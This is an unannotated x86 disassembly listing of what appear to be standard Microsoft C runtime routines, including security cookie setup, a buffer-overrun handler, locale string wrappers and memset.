  425a16:	mov    esi,eax
  425a18:	mov    eax,esi
  425a1a:	call   0x423893
  425a1f:	ret    
  425a20:	mov    esi,DWORD PTR [ebp-0x20]
  425a23:	push   0x4
  425a25:	call   0x42398b
  425a2a:	pop    ecx
  425a2b:	ret    
  425a2c:	push   ebp
  425a2d:	mov    ebp,esp
  425a2f:	sub    esp,0x10
  425a32:	push   esi
  425a33:	lea    eax,[ebp-0x8]
  425a36:	push   eax
  425a37:	call   DWORD PTR ds:0x4280c4
  425a3d:	mov    esi,DWORD PTR [ebp-0x4]
  425a40:	xor    esi,DWORD PTR [ebp-0x8]
  425a43:	call   DWORD PTR ds:0x4280c0
  425a49:	xor    esi,eax
  425a4b:	call   DWORD PTR ds:0x42806c
  425a51:	xor    esi,eax
  425a53:	call   DWORD PTR ds:0x4280bc
  425a59:	xor    esi,eax
  425a5b:	lea    eax,[ebp-0x10]
  425a5e:	push   eax
  425a5f:	call   DWORD PTR ds:0x4280b8
  425a65:	mov    eax,DWORD PTR [ebp-0xc]
  425a68:	xor    eax,DWORD PTR [ebp-0x10]
  425a6b:	xor    esi,eax
  425a6d:	mov    DWORD PTR ds:0x45c430,esi
  425a73:	jne    0x425a7f
  425a75:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425a7f:	pop    esi
  425a80:	leave  
  425a81:	ret    
  425a82:	push   0x118
  425a87:	push   0x428928
  425a8c:	call   0x423858
  425a91:	mov    eax,ds:0x45c430
  425a96:	xor    eax,DWORD PTR [ebp+0x4]
  425a99:	mov    DWORD PTR [ebp-0x1c],eax
  425a9c:	mov    eax,ds:0x45cd98
  425aa1:	xor    ecx,ecx
  425aa3:	cmp    eax,ecx
  425aa5:	je     0x425ac6
  425aa7:	mov    DWORD PTR [ebp-0x4],ecx
  425aaa:	push   DWORD PTR [ebp+0xc]
  425aad:	push   DWORD PTR [ebp+0x8]
  425ab0:	call   eax
  425ab2:	pop    ecx
  425ab3:	pop    ecx
  425ab4:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ab8:	jmp    0x425bc4
  425abd:	xor    eax,eax
  425abf:	inc    eax
  425ac0:	ret    
  425ac1:	mov    esp,DWORD PTR [ebp-0x18]
  425ac4:	jmp    0x425ab4
  425ac6:	mov    eax,DWORD PTR [ebp+0x8]
  425ac9:	dec    eax
  425aca:	je     0x425adf
  425acc:	mov    edi,0x428904
  425ad1:	mov    DWORD PTR [ebp-0x20],0x428850
  425ad8:	mov    esi,0xd4
  425add:	jmp    0x425af0
  425adf:	mov    edi,0x428830
  425ae4:	mov    DWORD PTR [ebp-0x20],0x428790
  425aeb:	mov    esi,0xb9
  425af0:	mov    BYTE PTR [ebp-0x24],cl
  425af3:	push   0x104
  425af8:	lea    eax,[ebp-0x128]
  425afe:	push   eax
  425aff:	push   ecx
  425b00:	call   DWORD PTR ds:0x42803c
  425b06:	test   eax,eax
  425b08:	jne    0x425b1d
  425b0a:	push   0x428484
  425b0f:	lea    eax,[ebp-0x128]
  425b15:	push   eax
  425b16:	call   0x423c40
  425b1b:	pop    ecx
  425b1c:	pop    ecx
  425b1d:	lea    ebx,[ebp-0x128]
  425b23:	lea    eax,[ebp-0x128]
  425b29:	push   eax
  425b2a:	call   0x423e70
  425b2f:	pop    ecx
  425b30:	add    eax,0xb
  425b33:	cmp    eax,0x3c
  425b36:	jbe    0x425b61
  425b38:	lea    eax,[ebp-0x128]
  425b3e:	push   eax
  425b3f:	call   0x423e70
  425b44:	mov    ebx,eax
  425b46:	lea    eax,[ebp-0x128]
  425b4c:	sub    eax,0x31
  425b4f:	add    ebx,eax
  425b51:	push   0x3
  425b53:	push   0x428480
  425b58:	push   ebx
  425b59:	call   0x423d40
  425b5e:	add    esp,0x10
  425b61:	push   ebx
  425b62:	call   0x423e70
  425b67:	pop    ecx
  425b68:	lea    eax,[eax+esi*1+0xc]
  425b6c:	add    eax,0x3
  425b6f:	and    eax,0xfffffffc
  425b72:	call   0x4238b0
  425b77:	mov    DWORD PTR [ebp-0x18],esp
  425b7a:	mov    esi,esp
  425b7c:	push   edi
  425b7d:	push   esi
  425b7e:	call   0x423c40
  425b83:	mov    edi,0x428460
  425b88:	push   edi
  425b89:	push   esi
  425b8a:	call   0x423c50
  425b8f:	push   0x428784
  425b94:	push   esi
  425b95:	call   0x423c50
  425b9a:	push   ebx
  425b9b:	push   esi
  425b9c:	call   0x423c50
  425ba1:	push   edi
  425ba2:	push   esi
  425ba3:	call   0x423c50
  425ba8:	push   DWORD PTR [ebp-0x20]
  425bab:	push   esi
  425bac:	call   0x423c50
  425bb1:	push   0x12010
  425bb6:	push   0x428438
  425bbb:	push   esi
  425bbc:	call   0x423b42
  425bc1:	add    esp,0x3c
  425bc4:	push   0x3
  425bc6:	call   0x422cc6
  425bcb:	int3   
  425bcc:	push   0x38
  425bce:	push   0x428d48
  425bd3:	call   0x423858
  425bd8:	xor    ebx,ebx
  425bda:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425be0:	jne    0x425c1a
  425be2:	push   ebx
  425be3:	push   ebx
  425be4:	xor    esi,esi
  425be6:	inc    esi
  425be7:	push   esi
  425be8:	push   0x428d44
  425bed:	push   0x100
  425bf2:	push   ebx
  425bf3:	call   DWORD PTR ds:0x4280d0
  425bf9:	test   eax,eax
  425bfb:	je     0x425c05
  425bfd:	mov    DWORD PTR ds:0x45cdbc,esi
  425c03:	jmp    0x425c1a
  425c05:	call   DWORD PTR ds:0x428010
  425c0b:	cmp    eax,0x78
  425c0e:	jne    0x425c1a
  425c10:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c1a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c1d:	jle    0x425c3a
  425c1f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c22:	mov    eax,DWORD PTR [ebp+0x10]
  425c25:	dec    ecx
  425c26:	cmp    BYTE PTR [eax],bl
  425c28:	je     0x425c32
  425c2a:	inc    eax
  425c2b:	cmp    ecx,ebx
  425c2d:	jne    0x425c25
  425c2f:	or     ecx,0xffffffff
  425c32:	or     eax,0xffffffff
  425c35:	sub    eax,ecx
  425c37:	add    DWORD PTR [ebp+0x14],eax
  425c3a:	mov    eax,ds:0x45cdbc
  425c3f:	cmp    eax,0x2
  425c42:	je     0x425e24
  425c48:	cmp    eax,ebx
  425c4a:	je     0x425e24
  425c50:	cmp    eax,0x1
  425c53:	jne    0x425e57
  425c59:	xor    edi,edi
  425c5b:	mov    DWORD PTR [ebp-0x1c],edi
  425c5e:	mov    DWORD PTR [ebp-0x20],ebx
  425c61:	mov    DWORD PTR [ebp-0x24],ebx
  425c64:	cmp    DWORD PTR [ebp+0x20],ebx
  425c67:	jne    0x425c71
  425c69:	mov    eax,ds:0x45cdb4
  425c6e:	mov    DWORD PTR [ebp+0x20],eax
  425c71:	push   ebx
  425c72:	push   ebx
  425c73:	push   DWORD PTR [ebp+0x14]
  425c76:	push   DWORD PTR [ebp+0x10]
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [ebp+0x24],ebx
  425c7e:	setne  al
  425c81:	lea    eax,[eax*8+0x1]
  425c88:	push   eax
  425c89:	push   DWORD PTR [ebp+0x20]
  425c8c:	call   DWORD PTR ds:0x4280cc
  425c92:	mov    esi,eax
  425c94:	mov    DWORD PTR [ebp-0x28],esi
  425c97:	cmp    esi,ebx
  425c99:	je     0x425e57
  425c9f:	mov    DWORD PTR [ebp-0x4],0x1
  425ca6:	lea    eax,[esi+esi*1]
  425ca9:	add    eax,0x3
  425cac:	and    eax,0xfffffffc
  425caf:	call   0x4238b0
  425cb4:	mov    DWORD PTR [ebp-0x18],esp
  425cb7:	mov    eax,esp
  425cb9:	mov    DWORD PTR [ebp-0x2c],eax
  425cbc:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cc0:	jmp    0x425cdd
  425cc2:	xor    eax,eax
  425cc4:	inc    eax
  425cc5:	ret    
  425cc6:	mov    esp,DWORD PTR [ebp-0x18]
  425cc9:	call   0x426cf5
  425cce:	xor    ebx,ebx
  425cd0:	mov    DWORD PTR [ebp-0x2c],ebx
  425cd3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cd7:	mov    edi,DWORD PTR [ebp-0x1c]
  425cda:	mov    esi,DWORD PTR [ebp-0x28]
  425cdd:	cmp    DWORD PTR [ebp-0x2c],ebx
  425ce0:	jne    0x425cfe
  425ce2:	lea    eax,[esi+esi*1]
  425ce5:	push   eax
  425ce6:	call   0x424582
  425ceb:	pop    ecx
  425cec:	mov    DWORD PTR [ebp-0x2c],eax
  425cef:	cmp    eax,ebx
  425cf1:	je     0x425e57
  425cf7:	mov    DWORD PTR [ebp-0x20],0x1
  425cfe:	push   esi
  425cff:	push   DWORD PTR [ebp-0x2c]
  425d02:	push   DWORD PTR [ebp+0x14]
  425d05:	push   DWORD PTR [ebp+0x10]
  425d08:	push   0x1
  425d0a:	push   DWORD PTR [ebp+0x20]
  425d0d:	call   DWORD PTR ds:0x4280cc
  425d13:	test   eax,eax
  425d15:	je     0x425e01
  425d1b:	push   ebx
  425d1c:	push   ebx
  425d1d:	push   esi
  425d1e:	push   DWORD PTR [ebp-0x2c]
  425d21:	push   DWORD PTR [ebp+0xc]
  425d24:	push   DWORD PTR [ebp+0x8]
  425d27:	call   DWORD PTR ds:0x4280d0
  425d2d:	mov    edi,eax
  425d2f:	mov    DWORD PTR [ebp-0x1c],edi
  425d32:	cmp    edi,ebx
  425d34:	je     0x425e01
  425d3a:	test   BYTE PTR [ebp+0xd],0x4
  425d3e:	je     0x425d6d
  425d40:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d43:	je     0x425e01
  425d49:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d4c:	jg     0x425e01
  425d52:	push   DWORD PTR [ebp+0x1c]
  425d55:	push   DWORD PTR [ebp+0x18]
  425d58:	push   esi
  425d59:	push   DWORD PTR [ebp-0x2c]
  425d5c:	push   DWORD PTR [ebp+0xc]
  425d5f:	push   DWORD PTR [ebp+0x8]
  425d62:	call   DWORD PTR ds:0x4280d0
  425d68:	jmp    0x425e01
  425d6d:	mov    DWORD PTR [ebp-0x4],0x2
  425d74:	lea    eax,[edi+edi*1]
  425d77:	add    eax,0x3
  425d7a:	and    eax,0xfffffffc
  425d7d:	call   0x4238b0
  425d82:	mov    DWORD PTR [ebp-0x18],esp
  425d85:	mov    eax,esp
  425d87:	mov    DWORD PTR [ebp-0x30],eax
  425d8a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d8e:	jmp    0x425dab
  425d90:	xor    eax,eax
  425d92:	inc    eax
  425d93:	ret    
  425d94:	mov    esp,DWORD PTR [ebp-0x18]
  425d97:	call   0x426cf5
  425d9c:	xor    ebx,ebx
  425d9e:	mov    DWORD PTR [ebp-0x30],ebx
  425da1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425da5:	mov    edi,DWORD PTR [ebp-0x1c]
  425da8:	mov    esi,DWORD PTR [ebp-0x28]
  425dab:	cmp    DWORD PTR [ebp-0x30],ebx
  425dae:	jne    0x425dc8
  425db0:	lea    eax,[edi+edi*1]
  425db3:	push   eax
  425db4:	call   0x424582
  425db9:	pop    ecx
  425dba:	mov    DWORD PTR [ebp-0x30],eax
  425dbd:	cmp    eax,ebx
  425dbf:	je     0x425e01
  425dc1:	mov    DWORD PTR [ebp-0x24],0x1
  425dc8:	push   edi
  425dc9:	push   DWORD PTR [ebp-0x30]
  425dcc:	push   esi
  425dcd:	push   DWORD PTR [ebp-0x2c]
  425dd0:	push   DWORD PTR [ebp+0xc]
  425dd3:	push   DWORD PTR [ebp+0x8]
  425dd6:	call   DWORD PTR ds:0x4280d0
  425ddc:	test   eax,eax
  425dde:	je     0x425e01
  425de0:	push   ebx
  425de1:	push   ebx
  425de2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425de5:	jne    0x425deb
  425de7:	push   ebx
  425de8:	push   ebx
  425de9:	jmp    0x425df1
  425deb:	push   DWORD PTR [ebp+0x1c]
  425dee:	push   DWORD PTR [ebp+0x18]
  425df1:	push   edi
  425df2:	push   DWORD PTR [ebp-0x30]
  425df5:	push   ebx
  425df6:	push   DWORD PTR [ebp+0x20]
  425df9:	call   DWORD PTR ds:0x428050
  425dff:	mov    edi,eax
  425e01:	cmp    DWORD PTR [ebp-0x24],ebx
  425e04:	je     0x425e0f
  425e06:	push   DWORD PTR [ebp-0x30]
  425e09:	call   0x42446a
  425e0e:	pop    ecx
  425e0f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e12:	je     0x425e1d
  425e14:	push   DWORD PTR [ebp-0x2c]
  425e17:	call   0x42446a
  425e1c:	pop    ecx
  425e1d:	mov    eax,edi
  425e1f:	jmp    0x425f7f
  425e24:	mov    DWORD PTR [ebp-0x34],ebx
  425e27:	xor    edi,edi
  425e29:	mov    DWORD PTR [ebp-0x38],ebx
  425e2c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e2f:	jne    0x425e39
  425e31:	mov    eax,ds:0x45cda4
  425e36:	mov    DWORD PTR [ebp+0x8],eax
  425e39:	cmp    DWORD PTR [ebp+0x20],ebx
  425e3c:	jne    0x425e46
  425e3e:	mov    eax,ds:0x45cdb4
  425e43:	mov    DWORD PTR [ebp+0x20],eax
  425e46:	push   DWORD PTR [ebp+0x8]
  425e49:	call   0x426add
  425e4e:	pop    ecx
  425e4f:	mov    DWORD PTR [ebp-0x3c],eax
  425e52:	cmp    eax,0xffffffff
  425e55:	jne    0x425e5e
  425e57:	xor    eax,eax
  425e59:	jmp    0x425f7f
  425e5e:	cmp    eax,DWORD PTR [ebp+0x20]
  425e61:	je     0x425f55
  425e67:	push   ebx
  425e68:	push   ebx
  425e69:	lea    ecx,[ebp+0x14]
  425e6c:	push   ecx
  425e6d:	push   DWORD PTR [ebp+0x10]
  425e70:	push   eax
  425e71:	push   DWORD PTR [ebp+0x20]
  425e74:	call   0x426b26
  425e79:	add    esp,0x18
  425e7c:	mov    DWORD PTR [ebp-0x34],eax
  425e7f:	cmp    eax,ebx
  425e81:	je     0x425e57
  425e83:	push   ebx
  425e84:	push   ebx
  425e85:	push   DWORD PTR [ebp+0x14]
  425e88:	push   eax
  425e89:	push   DWORD PTR [ebp+0xc]
  425e8c:	push   DWORD PTR [ebp+0x8]
  425e8f:	call   DWORD PTR ds:0x4280c8
  425e95:	mov    esi,eax
  425e97:	mov    DWORD PTR [ebp-0x40],esi
  425e9a:	cmp    esi,ebx
  425e9c:	je     0x425f44
  425ea2:	mov    DWORD PTR [ebp-0x4],ebx
  425ea5:	add    eax,0x3
  425ea8:	and    eax,0xfffffffc
  425eab:	call   0x4238b0
  425eb0:	mov    DWORD PTR [ebp-0x18],esp
  425eb3:	mov    edi,esp
  425eb5:	mov    DWORD PTR [ebp-0x44],edi
  425eb8:	push   esi
  425eb9:	push   ebx
  425eba:	push   edi
  425ebb:	call   0x426160
  425ec0:	add    esp,0xc
  425ec3:	jmp    0x425ed5
  425ec5:	xor    eax,eax
  425ec7:	inc    eax
  425ec8:	ret    
  425ec9:	mov    esp,DWORD PTR [ebp-0x18]
  425ecc:	call   0x426cf5
  425ed1:	xor    ebx,ebx
  425ed3:	xor    edi,edi
  425ed5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ed9:	cmp    edi,ebx
  425edb:	jne    0x425f00
  425edd:	push   DWORD PTR [ebp-0x40]
  425ee0:	call   0x424582
  425ee5:	pop    ecx
  425ee6:	mov    edi,eax
  425ee8:	cmp    edi,ebx
  425eea:	je     0x425f1d
  425eec:	push   DWORD PTR [ebp-0x40]
  425eef:	push   ebx
  425ef0:	push   edi
  425ef1:	call   0x426160
  425ef6:	add    esp,0xc
  425ef9:	mov    DWORD PTR [ebp-0x38],0x1
  425f00:	push   DWORD PTR [ebp-0x40]
  425f03:	push   edi
  425f04:	push   DWORD PTR [ebp+0x14]
  425f07:	push   DWORD PTR [ebp-0x34]
  425f0a:	push   DWORD PTR [ebp+0xc]
  425f0d:	push   DWORD PTR [ebp+0x8]
  425f10:	call   DWORD PTR ds:0x4280c8
  425f16:	mov    DWORD PTR [ebp-0x40],eax
  425f19:	cmp    eax,ebx
  425f1b:	jne    0x425f21
  425f1d:	xor    esi,esi
  425f1f:	jmp    0x425f47
  425f21:	push   DWORD PTR [ebp+0x1c]
  425f24:	push   DWORD PTR [ebp+0x18]
  425f27:	lea    eax,[ebp-0x40]
  425f2a:	push   eax
  425f2b:	push   edi
  425f2c:	push   DWORD PTR [ebp+0x20]
  425f2f:	push   DWORD PTR [ebp-0x3c]
  425f32:	call   0x426b26
  425f37:	add    esp,0x18
  425f3a:	mov    esi,eax
  425f3c:	neg    esi
  425f3e:	sbb    esi,esi
  425f40:	neg    esi
  425f42:	jmp    0x425f47
  425f44:	mov    esi,DWORD PTR [ebp-0x48]
  425f47:	cmp    DWORD PTR [ebp-0x38],ebx
  425f4a:	je     0x425f6f
  425f4c:	push   edi
  425f4d:	call   0x42446a
  425f52:	pop    ecx
  425f53:	jmp    0x425f6f
  425f55:	push   DWORD PTR [ebp+0x1c]
  425f58:	push   DWORD PTR [ebp+0x18]
  425f5b:	push   DWORD PTR [ebp+0x14]
  425f5e:	push   DWORD PTR [ebp+0x10]
  425f61:	push   DWORD PTR [ebp+0xc]
  425f64:	push   DWORD PTR [ebp+0x8]
  425f67:	call   DWORD PTR ds:0x4280c8
  425f6d:	mov    esi,eax
  425f6f:	cmp    DWORD PTR [ebp-0x34],ebx
  425f72:	je     0x425f7d
  425f74:	push   DWORD PTR [ebp-0x34]
  425f77:	call   0x42446a
  425f7c:	pop    ecx
  425f7d:	mov    eax,esi
  425f7f:	lea    esp,[ebp-0x54]
  425f82:	call   0x423893
  425f87:	ret    
  425f88:	push   0x1c
  425f8a:	push   0x428d70
  425f8f:	call   0x423858
  425f94:	xor    esi,esi
  425f96:	cmp    DWORD PTR ds:0x45cdc0,esi
  425f9c:	jne    0x425fd3
  425f9e:	lea    eax,[ebp-0x1c]
  425fa1:	push   eax
  425fa2:	xor    edi,edi
  425fa4:	inc    edi
  425fa5:	push   edi
  425fa6:	push   0x428d44
  425fab:	push   edi
  425fac:	call   DWORD PTR ds:0x4280d8
  425fb2:	test   eax,eax
  425fb4:	je     0x425fbe
  425fb6:	mov    DWORD PTR ds:0x45cdc0,edi
  425fbc:	jmp    0x425fd3
  425fbe:	call   DWORD PTR ds:0x428010
  425fc4:	cmp    eax,0x78
  425fc7:	jne    0x425fd3
  425fc9:	mov    DWORD PTR ds:0x45cdc0,0x2
  425fd3:	mov    eax,ds:0x45cdc0
  425fd8:	cmp    eax,0x2
  425fdb:	je     0x4260cb
  425fe1:	cmp    eax,esi
  425fe3:	je     0x4260cb
  425fe9:	cmp    eax,0x1
  425fec:	jne    0x4260f1
  425ff2:	mov    DWORD PTR [ebp-0x20],esi
  425ff5:	mov    DWORD PTR [ebp-0x24],esi
  425ff8:	cmp    DWORD PTR [ebp+0x18],esi
  425ffb:	jne    0x426005
  425ffd:	mov    eax,ds:0x45cdb4
  426002:	mov    DWORD PTR [ebp+0x18],eax
  426005:	push   esi
  426006:	push   esi
  426007:	push   DWORD PTR [ebp+0x10]
  42600a:	push   DWORD PTR [ebp+0xc]
  42600d:	xor    eax,eax
  42600f:	cmp    DWORD PTR [ebp+0x20],esi
  426012:	setne  al
  426015:	lea    eax,[eax*8+0x1]
  42601c:	push   eax
  42601d:	push   DWORD PTR [ebp+0x18]
  426020:	call   DWORD PTR ds:0x4280cc
  426026:	mov    edi,eax
  426028:	mov    DWORD PTR [ebp-0x28],edi
  42602b:	test   edi,edi
  42602d:	je     0x4260f1
  426033:	and    DWORD PTR [ebp-0x4],0x0
  426037:	lea    ebx,[edi+edi*1]
  42603a:	mov    eax,ebx
  42603c:	add    eax,0x3
  42603f:	and    eax,0xfffffffc
  426042:	call   0x4238b0
  426047:	mov    DWORD PTR [ebp-0x18],esp
  42604a:	mov    esi,esp
  42604c:	mov    DWORD PTR [ebp-0x2c],esi
  42604f:	push   ebx
  426050:	push   0x0
  426052:	push   esi
  426053:	call   0x426160
  426058:	add    esp,0xc
  42605b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42605f:	jmp    0x426076
  426061:	xor    eax,eax
  426063:	inc    eax
  426064:	ret    
  426065:	mov    esp,DWORD PTR [ebp-0x18]
  426068:	call   0x426cf5
  42606d:	xor    esi,esi
  42606f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426073:	mov    edi,DWORD PTR [ebp-0x28]
  426076:	test   esi,esi
  426078:	jne    0x426091
  42607a:	push   edi
  42607b:	push   0x2
  42607d:	call   0x424978
  426082:	pop    ecx
  426083:	pop    ecx
  426084:	mov    esi,eax
  426086:	test   esi,esi
  426088:	je     0x4260f1
  42608a:	mov    DWORD PTR [ebp-0x24],0x1
  426091:	push   edi
  426092:	push   esi
  426093:	push   DWORD PTR [ebp+0x10]
  426096:	push   DWORD PTR [ebp+0xc]
  426099:	push   0x1
  42609b:	push   DWORD PTR [ebp+0x18]
  42609e:	call   DWORD PTR ds:0x4280cc
  4260a4:	test   eax,eax
  4260a6:	je     0x4260b9
  4260a8:	push   DWORD PTR [ebp+0x14]
  4260ab:	push   eax
  4260ac:	push   esi
  4260ad:	push   DWORD PTR [ebp+0x8]
  4260b0:	call   DWORD PTR ds:0x4280d8
  4260b6:	mov    DWORD PTR [ebp-0x20],eax
  4260b9:	cmp    DWORD PTR [ebp-0x24],0x0
  4260bd:	je     0x4260c6
  4260bf:	push   esi
  4260c0:	call   0x42446a
  4260c5:	pop    ecx
  4260c6:	mov    eax,DWORD PTR [ebp-0x20]
  4260c9:	jmp    0x426139
  4260cb:	mov    ebx,DWORD PTR [ebp+0x1c]
  4260ce:	cmp    ebx,esi
  4260d0:	jne    0x4260d8
  4260d2:	mov    ebx,DWORD PTR ds:0x45cda4
  4260d8:	mov    edi,DWORD PTR [ebp+0x18]
  4260db:	test   edi,edi
  4260dd:	jne    0x4260e5
  4260df:	mov    edi,DWORD PTR ds:0x45cdb4
  4260e5:	push   ebx
  4260e6:	call   0x426add
  4260eb:	pop    ecx
  4260ec:	cmp    eax,0xffffffff
  4260ef:	jne    0x4260f5
  4260f1:	xor    eax,eax
  4260f3:	jmp    0x426139
  4260f5:	cmp    eax,edi
  4260f7:	je     0x426117
  4260f9:	push   0x0
  4260fb:	push   0x0
  4260fd:	lea    ecx,[ebp+0x10]
  426100:	push   ecx
  426101:	push   DWORD PTR [ebp+0xc]
  426104:	push   eax
  426105:	push   edi
  426106:	call   0x426b26
  42610b:	add    esp,0x18
  42610e:	mov    esi,eax
  426110:	test   esi,esi
  426112:	je     0x4260f1
  426114:	mov    DWORD PTR [ebp+0xc],esi
  426117:	push   DWORD PTR [ebp+0x14]
  42611a:	push   DWORD PTR [ebp+0x10]
  42611d:	push   DWORD PTR [ebp+0xc]
  426120:	push   DWORD PTR [ebp+0x8]
  426123:	push   ebx
  426124:	call   DWORD PTR ds:0x4280d4
  42612a:	mov    edi,eax
  42612c:	test   esi,esi
  42612e:	je     0x426137
  426130:	push   esi
  426131:	call   0x42446a
  426136:	pop    ecx
  426137:	mov    eax,edi
  426139:	lea    esp,[ebp-0x38]
  42613c:	call   0x423893
  426141:	ret    
  426142:	mov    eax,ds:0x45cdc4
  426147:	test   eax,eax
  426149:	je     0x42615a
  42614b:	push   DWORD PTR [esp+0x4]
  42614f:	call   eax
  426151:	test   eax,eax
  426153:	pop    ecx
  426154:	je     0x42615a
  426156:	xor    eax,eax
  426158:	inc    eax
  426159:	ret    
  42615a:	xor    eax,eax
  42615c:	ret    
  42615d:	int3   
  42615e:	int3   
  42615f:	int3   
  426160:	mov    edx,DWORD PTR [esp+0xc]
  426164:	mov    ecx,DWORD PTR [esp+0x4]
  426168:	test   edx,edx
  42616a:	je     0x4261bb
  42616c:	xor    eax,eax
  42616e:	mov    al,BYTE PTR [esp+0x8]
  426172:	push   edi
  426173:	mov    edi,ecx
  426175:	cmp    edx,0x4
  426178:	jb     0x4261ab
  42617a:	neg    ecx
  42617c:	and    ecx,0x3
  42617f:	je     0x42618d
  426181:	sub    edx,ecx
  426183:	mov    BYTE PTR [edi],al
  426185:	add    edi,0x1
  426188:	sub    ecx,0x1
  42618b:	jne    0x426183
  42618d:	mov    ecx,eax
  42618f:	shl    eax,0x8
  426192:	add    eax,ecx
  426194:	mov    ecx,eax
  426196:	shl    eax,0x10
  426199:	add    eax,ecx
  42619b:	mov    ecx,edx
  42619d:	and    edx,0x3
  4261a0:	shr    ecx,0x2
  4261a3:	je     0x4261ab
  4261a5:	rep stos DWORD PTR es:[edi],eax
  4261a7:	test   edx,edx
  4261a9:	je     0x4261b5
  4261ab:	mov    BYTE PTR [edi],al
  4261ad:	add    edi,0x1
  4261b0:	sub    edx,0x1
  4261b3:	jne    0x4261ab
  4261b5:	mov    eax,DWORD PTR [esp+0x8]
  4261b9:	pop    edi
  4261ba:	ret    
  4261bb:	mov    eax,DWORD PTR [esp+0x4]
  4261bf:	ret    
  4261c0:	push   esi
  4261c1:	mov    esi,DWORD PTR [esp+0x8]
  4261c5:	test   esi,esi
  4261c7:	je     0x42634e
  4261cd:	push   DWORD PTR [esi+0x4]
  4261d0:	call   0x42446a
  4261d5:	push   DWORD PTR [esi+0x8]
  4261d8:	call   0x42446a
  4261dd:	push   DWORD PTR [esi+0xc]
  4261e0:	call   0x42446a
  4261e5:	push   DWORD PTR [esi+0x10]
  4261e8:	call   0x42446a
  4261ed:	push   DWORD PTR [esi+0x14]
  4261f0:	call   0x42446a
  4261f5:	push   DWORD PTR [esi+0x18]
  4261f8:	call   0x42446a
  4261fd:	push   DWORD PTR [esi]
  4261ff:	call   0x42446a
  426204:	push   DWORD PTR [esi+0x20]
  426207:	call   0x42446a
  42620c:	push   DWORD PTR [esi+0x24]
  42620f:	call   0x42446a
  426214:	push   DWORD PTR [esi+0x28]
  426217:	call   0x42446a
  42621c:	push   DWORD PTR [esi+0x2c]
  42621f:	call   0x42446a
  426224:	push   DWORD PTR [esi+0x30]
  426227:	call   0x42446a
  42622c:	push   DWORD PTR [esi+0x34]
  42622f:	call   0x42446a
  426234:	push   DWORD PTR [esi+0x1c]
  426237:	call   0x42446a
  42623c:	push   DWORD PTR [esi+0x38]
  42623f:	call   0x42446a
  426244:	push   DWORD PTR [esi+0x3c]
  426247:	call   0x42446a
  42624c:	add    esp,0x40
  42624f:	push   DWORD PTR [esi+0x40]
  426252:	call   0x42446a
  426257:	push   DWORD PTR [esi+0x44]
  42625a:	call   0x42446a
  42625f:	push   DWORD PTR [esi+0x48]
  426262:	call   0x42446a
  426267:	push   DWORD PTR [esi+0x4c]
  42626a:	call   0x42446a
  42626f:	push   DWORD PTR [esi+0x50]
  426272:	call   0x42446a
  426277:	push   DWORD PTR [esi+0x54]
  42627a:	call   0x42446a
  42627f:	push   DWORD PTR [esi+0x58]
  426282:	call   0x42446a
  426287:	push   DWORD PTR [esi+0x5c]
  42628a:	call   0x42446a
  42628f:	push   DWORD PTR [esi+0x60]
  426292:	call   0x42446a
  426297:	push   DWORD PTR [esi+0x64]
  42629a:	call   0x42446a
  42629f:	push   DWORD PTR [esi+0x68]
  4262a2:	call   0x42446a
  4262a7:	push   DWORD PTR [esi+0x6c]
  4262aa:	call   0x42446a
  4262af:	push   DWORD PTR [esi+0x70]
  4262b2:	call   0x42446a
  4262b7:	push   DWORD PTR [esi+0x74]
  4262ba:	call   0x42446a
  4262bf:	push   DWORD PTR [esi+0x78]
  4262c2:	call   0x42446a
  4262c7:	push   DWORD PTR [esi+0x7c]
  4262ca:	call   0x42446a
  4262cf:	add    esp,0x40
  4262d2:	push   DWORD PTR [esi+0x80]
  4262d8:	call   0x42446a
  4262dd:	push   DWORD PTR [esi+0x84]
  4262e3:	call   0x42446a
  4262e8:	push   DWORD PTR [esi+0x88]
  4262ee:	call   0x42446a
  4262f3:	push   DWORD PTR [esi+0x8c]
  4262f9:	call   0x42446a
  4262fe:	push   DWORD PTR [esi+0x90]
  426304:	call   0x42446a
  426309:	push   DWORD PTR [esi+0x94]
  42630f:	call   0x42446a
  426314:	push   DWORD PTR [esi+0x98]
  42631a:	call   0x42446a
  42631f:	push   DWORD PTR [esi+0x9c]
  426325:	call   0x42446a
  42632a:	push   DWORD PTR [esi+0xa0]
  426330:	call   0x42446a
  426335:	push   DWORD PTR [esi+0xa4]
  42633b:	call   0x42446a
  426340:	push   DWORD PTR [esi+0xa8]
  426346:	call   0x42446a
  42634b:	add    esp,0x2c
  42634e:	pop    esi
  42634f:	ret    
  426350:	push   esi
  426351:	mov    esi,DWORD PTR [esp+0x8]
  426355:	test   esi,esi
  426357:	je     0x4263ad
  426359:	mov    eax,DWORD PTR [esi]
  42635b:	mov    ecx,DWORD PTR ds:0x45c934
  426361:	cmp    eax,DWORD PTR [ecx]
  426363:	je     0x426374
  426365:	cmp    eax,DWORD PTR ds:0x45c904
  42636b:	je     0x426374
  42636d:	push   eax
  42636e:	call   0x42446a
  426373:	pop    ecx
  426374:	mov    eax,DWORD PTR [esi+0x4]
  426377:	mov    ecx,DWORD PTR ds:0x45c934
  42637d:	cmp    eax,DWORD PTR [ecx+0x4]
  426380:	je     0x426391
  426382:	cmp    eax,DWORD PTR ds:0x45c908
  426388:	je     0x426391
  42638a:	push   eax
  42638b:	call   0x42446a
  426390:	pop    ecx
  426391:	mov    esi,DWORD PTR [esi+0x8]
  426394:	mov    eax,ds:0x45c934
  426399:	cmp    esi,DWORD PTR [eax+0x8]
  42639c:	je     0x4263ad
  42639e:	cmp    esi,DWORD PTR ds:0x45c90c
  4263a4:	je     0x4263ad
  4263a6:	push   esi
  4263a7:	call   0x42446a
  4263ac:	pop    ecx
  4263ad:	pop    esi
  4263ae:	ret    
